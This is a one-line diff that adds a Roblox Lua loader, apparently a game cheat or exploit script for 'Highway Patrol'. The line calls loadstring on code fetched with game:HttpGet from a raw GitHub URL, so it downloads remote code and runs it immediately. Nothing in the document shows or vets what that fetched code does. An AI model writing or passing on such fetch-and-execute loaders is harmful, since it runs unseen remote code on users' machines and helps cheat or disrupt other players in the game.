@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/highway-patrol-alpha-spam4-ak4u7ssujrjht6.lua"))()
